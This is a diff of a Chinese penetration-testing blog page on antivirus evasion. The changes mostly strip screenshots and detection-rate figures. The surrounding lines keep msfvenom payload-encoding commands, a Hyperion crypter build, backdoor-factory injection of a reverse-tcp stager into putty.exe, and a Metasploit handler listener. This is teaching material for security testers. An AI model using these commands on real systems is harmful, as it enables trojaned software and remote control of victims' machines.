@@ -126,28 +126,14 @@
 <meta property="og:url" content="https://shu1l.github.io/2020/04/28/shen-tou-ce-shi-zhi-mian-sha-ru-men/index.html">
 <meta property="og:site_name" content="Shu1L&#39;s blog">
 <meta property="og:description" content="渗透测试——免杀部分知识1.恶意软件 病毒、木马、蠕虫、键盘激励、僵尸程序、流氓软件、勒索软件、广告程序 在用户非自愿的情况下执行安装 处于某种恶意的目的：控制、窃取、勒索、偷窥、推送、攻击……    2.防病毒软件 恶意程序最主要的防护手段 杀毒软件&#x2F;防病毒软件 客户端&#x2F;服务器&#x2F;邮件防病毒   检测原理 基于二进制文件中特征签名的黑名单检测方法 基于行为的分析方法（启发式）   事后手段 永远落">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20190413174114743.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20190413174123784.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20190413174128295.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20190413174133640.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20190413174137778.png">
 <meta property="og:image" content="d:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%85%8D%E6%9D%80%E5%85%A5%E9%97%A8%5C20190413174142304.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20190413174147316.png">
 <meta property="og:image" content="https://shu1l.github.io/2020/04/28/shen-tou-ce-shi-zhi-mian-sha-ru-men/20190413174154985.png">
 <meta property="og:image" content="https://shu1l.github.io/2020/04/28/shen-tou-ce-shi-zhi-mian-sha-ru-men/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20190525145320244.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/201905251453287.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20190525145334950.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20190525145341279.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20190525145347873.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20190525145357145.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20190525145405583.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20190525145414174.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70">
 <meta property="article:published_time" content="2020-04-28T13:18:46.000Z">
-<meta property="article:modified_time" content="2020-04-30T13:09:46.379Z">
+<meta property="article:modified_time" content="2020-05-17T11:07:53.691Z">
 <meta property="article:author" content="Shu1L">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://img-blog.csdnimg.cn/20190413174114743.png">
+<meta name="twitter:image" content="d:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%85%8D%E6%9D%80%E5%85%A5%E9%97%A8%5C20190413174142304.png">
 
 
 
@@ -506,12 +492,8 @@
 <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# msfvenom -p windows/shell/bind_tcp <span class="attribute">lhost</span>=10.10.10.132 <span class="attribute">lport</span>=4444 -f<span class="built_in"> raw </span>-e x86/shikata_ga_nai -i 5 | msfvenom -a x86 --platform windows -e x86/countdown -i 8  -f<span class="built_in"> raw </span>| msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -b <span class="string">'\x00'</span> -f exe -o b.exe</span><br></pre></td></tr></table></figure>
 
 <ul>
-<li>比较编码前后的检测率<ul>
-<li>未经过编码的 a.exe 检测率是 45%</li>
+<li>比较编码前后的检测率</li>
 </ul>
-</li>
-</ul>
-<p><img src="https://img-blog.csdnimg.cn/20190413174114743.png" alt="在这里插入图片描述"></p>
 <h5 id="2-隐藏shell"><a href="#2-隐藏shell" class="headerlink" title="2.隐藏shell"></a>2.隐藏shell</h5><ul>
 <li>利用模板隐藏 shell</li>
 </ul>
@@ -523,16 +505,7 @@
 <figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">root@</span>kali:~# msfvenom -p windows/shell/bind_tcp -x /usr/share/windows-binaries/plink.exe lhost=<span class="number">10.10</span><span class="number">.10</span><span class="number">.131</span> lport=<span class="number">4444</span> -e x86/shikata_ga_nai -i <span class="number">5</span> -a x86 --platform win -f exe &gt; d.exe</span><br></pre></td></tr></table></figure>
 
 <ul>
-<li><p>比较编码前后的检测率</p>
-<ul>
-<li>未经过编码的 c.exe 检测率是 40%</li>
-</ul>
-<p><img src="https://img-blog.csdnimg.cn/20190413174123784.png" alt="在这里插入图片描述"></p>
-<ul>
-<li>经过编码的 d.exe 检测率是 30%</li>
-</ul>
-<p><img src="https://img-blog.csdnimg.cn/20190413174128295.png" alt="在这里插入图片描述"></p>
-</li>
+<li>比较编码前后的检测率</li>
 </ul>
 <h4 id="软件保护"><a href="#软件保护" class="headerlink" title="软件保护"></a>软件保护</h4><ul>
 <li>软件开发商为保护版权，采用的混淆和加密技术避免盗版逆向</li>
@@ -543,16 +516,8 @@
 <figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># git clone https://github.com/nullsecuritynet/tools/raw/master/binary/hyperion/release/Hyperion-1.2.zip</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># unzip Hyperion-1.2.zip</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># dpkg --add-architecture i386 &amp;&amp; apt-get update &amp;&amp; apt-get install wine32</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成加密器</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># cd Hyperion-1.2 &amp;&amp; i686-w64-mingw32-g++ -static-libgcc -static-libstdc++ Src/Crypter/*.cpp -o h.exe</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成木马程序</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># msfvenom -p windows/shell/reverse_tcp lhost=10.10.10.131 lport=4444 --platform win -e x86/shikata_ga_nai -a x86 -f exe -o p.exe</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 对木马程序进行加密</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># wine h.exe p.exe x.exe</span></span><br></pre></td></tr></table></figure>
 
 <ul>
-<li><p>比较编码前后的检测率</p>
-<ul>
-<li>未经过编码的 p.exe 检测率是 45%</li>
+<li>比较编码前后的检测率</li>
 </ul>
-<p><img src="https://img-blog.csdnimg.cn/20190413174133640.png" alt="在这里插入图片描述"></p>
-</li>
-<li><p>未经过编码的 x.exe 检测率是 37%</p>
-</li>
-</ul>
-<p><img src="https://img-blog.csdnimg.cn/20190413174137778.png" alt="在这里插入图片描述"></p>
 <h4 id="7-自己编写后门"><a href="#7-自己编写后门" class="headerlink" title="7.自己编写后门"></a>7.自己编写后门</h4><ul>
 <li>Windows reverse shell</li>
 </ul>
@@ -564,7 +529,6 @@
 <figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># gcc linux_revers_shell.c -o linux</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试程序</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># nc -nvlp 333</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># ./linux 127.0.0.1 333</span></span><br></pre></td></tr></table></figure>
 
 <p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%85%8D%E6%9D%80%E5%85%A5%E9%97%A8%5C20190413174142304.png" alt="在这里插入图片描述"></p>
-<p><img src="https://img-blog.csdnimg.cn/20190413174147316.png" alt="在这里插入图片描述"></p>
 <ul>
 <li>linux_revers_shell.c</li>
 </ul>
@@ -671,45 +635,32 @@
 </ul>
 <figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-c：code cave(代码裂缝)</span><br><span class="line">-l：代码裂缝大小</span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># backdoor-factory -f putty.exe -c -l 200</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/20190525145320244.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <ul>
 <li><p>-s SHELL, –shell=SHELL: 可以使用的有效负载。使用“show”来查看有效载荷</p>
 <figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root<span class="meta">@kali</span>:~# backdoor-<span class="keyword">factory</span> -f putty.exe -s <span class="keyword">show</span></span><br></pre></td></tr></table></figure>
 
 </li>
 </ul>
-<p><img src="https://img-blog.csdnimg.cn/201905251453287.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root<span class="meta">@kali</span>:~# backdoor-<span class="keyword">factory</span> -f `which nc` -s <span class="keyword">show</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/20190525145334950.png" alt="在这里插入图片描述"></p>
 <ul>
 <li><p>注入 putty.exe，报错</p>
 <figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">root@</span>kali:~# backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H <span class="number">10.10</span><span class="number">.10</span><span class="number">.131</span> -P <span class="number">4444</span> -o putty2.exe</span><br></pre></td></tr></table></figure>
 
 </li>
 </ul>
-<p><img src="https://img-blog.csdnimg.cn/20190525145341279.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">[!]</span> <span class="attr">Enter your selection:</span> <span class="number">2</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/20190525145347873.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <ul>
 <li><p>显示未找到文件</p>
 <figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Failed to read certificate <span class="string">file:</span> <span class="regexp">/usr/</span>share<span class="regexp">/backdoor-factory/</span>certs/Verisign.cer</span><br><span class="line"><span class="number">139701503748160</span>:<span class="string">error:</span><span class="number">02001002</span>:system <span class="string">library:</span><span class="string">fopen:</span>No such file or <span class="string">directory:</span>bss_file.<span class="string">c:</span><span class="number">175</span>:fopen(<span class="string">'/usr/share/backdoor-factory/certs/VerisignPrivateKey.pem'</span>,<span class="string">'rb'</span>)</span><br><span class="line"><span class="number">139701503748160</span>:<span class="string">error:</span><span class="number">2006</span><span class="string">D080:</span>BIO <span class="string">routines:</span><span class="string">BIO_new_file:</span>no such <span class="string">file:</span>bss_file.<span class="string">c:</span><span class="number">182</span>:</span><br><span class="line"><span class="number">139701503748160</span>:<span class="string">error:</span><span class="number">02001002</span>:system <span class="string">library:</span><span class="string">fopen:</span>No such file or <span class="string">directory:</span>bss_file.<span class="string">c:</span><span class="number">175</span>:fopen(<span class="string">'/usr/share/backdoor-factory/certs/Verisign.cer'</span>,<span class="string">'rb'</span>)</span><br><span class="line"><span class="number">139701503748160</span>:<span class="string">error:</span><span class="number">2006</span><span class="string">D080:</span>BIO <span class="string">routines:</span><span class="string">BIO_new_file:</span>no such <span class="string">file:</span>bss_file.<span class="string">c:</span><span class="number">182</span>:</span><br><span class="line">Failed</span><br><span class="line">File putty5.exe is <span class="keyword">in</span> the <span class="string">'backdoored'</span> directory</span><br></pre></td></tr></table></figure>
 </li>
 <li><p>修复错误（备份并重命名）</p>
 <figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># cat /usr/share/backdoor-factory/certs/</span></span><br><span class="line">passFile.txt           signingCert.cer        signingPrivateKey.pem  </span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># cd /usr/share/backdoor-factory/certs/</span></span><br><span class="line">  </span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:/usr/share/backdoor-factory/certs</span><span class="comment"># cp signingCert.cer signingCert.cer.bak</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:/usr/share/backdoor-factory/certs</span><span class="comment"># mv signingCert.cer Verisign.cer</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:/usr/share/backdoor-factory/certs</span><span class="comment"># cp signingPrivateKey.pem signingPrivateKey.pem.bak</span></span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:/usr/share/backdoor-factory/certs</span><span class="comment"># mv signingPrivateKey.pem VerisignPrivateKey.pem</span></span><br><span class="line">  </span><br><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H 10.10.10.131 -P 4444 -o putty2.exe</span></span><br></pre></td></tr></table></figure>
-
 </li>
-</ul>
-<p><img src="https://img-blog.csdnimg.cn/20190525145357145.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<ul>
 <li><p>使用 msf 侦听</p>
 <figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/<span class="keyword">handler</span></span><br><span class="line">msf exploit(multi/<span class="keyword">handler</span>) &gt; <span class="keyword">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(multi/<span class="keyword">handler</span>) &gt; <span class="keyword">set</span> LHOST <span class="number">10.10</span><span class="number">.10</span><span class="number">.131</span></span><br><span class="line">msf exploit(multi/<span class="keyword">handler</span>) &gt; <span class="keyword">set</span> LPORT <span class="number">4444</span></span><br><span class="line">msf exploit(multi/<span class="keyword">handler</span>) &gt; run</span><br></pre></td></tr></table></figure>
-
 </li>
-</ul>
-<p><img src="https://img-blog.csdnimg.cn/20190525145405583.png" alt="在这里插入图片描述"></p>
-<ul>
 <li><p>windows 运行被注入 putty2.exe 程序，kali 反弹成功</p>
 </li>
 <li><p>免杀效果比较</p>
@@ -724,7 +675,6 @@
 
 </li>
 </ul>
-<p><img src="https://img-blog.csdnimg.cn/20190525145414174.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <h4 id="后门工具–Bdfproxy"><a href="#后门工具–Bdfproxy" class="headerlink" title="后门工具–Bdfproxy"></a>后门工具–Bdfproxy</h4><h4 id="1-简介-1"><a href="#1-简介-1" class="headerlink" title="1.简介"></a>1.简介</h4><ul>
 <li>Bdfproxy（mitmproxy）<ul>
 <li>基于流量劫持（中间人攻击）动态注入 shellcode （ARP spoof、DNS spoof、Fake AP）</li>
@@ -940,7 +890,7 @@
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">44</span>
+                  <span class="site-state-item-count">43</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
